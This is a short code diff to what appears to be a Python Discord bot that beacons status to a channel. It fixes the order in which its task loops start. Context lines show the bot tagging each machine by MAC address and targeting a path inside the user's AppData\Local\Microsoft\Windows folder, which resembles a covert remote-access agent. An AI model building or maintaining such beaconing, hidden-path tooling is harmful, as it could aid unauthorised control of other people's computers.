@@ -104,7 +104,7 @@ def get_device_ip():
     return ':'.join(mac[i:i+2] for i in range(0, 12, 2))
 
 INSTANCE_ID = get_device_ip()
-UPDATE_INTERVAL = 30  # seconds
+UPDATE_INTERVAL = 30
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
@@ -216,10 +216,6 @@ async def on_ready():
                 if channel:
                     await channel.send(embed=embed)
 
-    send_status.start()
-    update_activity.start()
-    cleanup_old_messages.start()
-
     @tasks.loop(seconds=UPDATE_INTERVAL)
     async def send_status():
         global last_message
@@ -275,6 +271,10 @@ async def on_ready():
             return time.time() - timestamp < UPDATE_INTERVAL * 1.5
         except:
             return False
+        
+    send_status.start()
+    update_activity.start()
+    cleanup_old_messages.start()
 
 
 
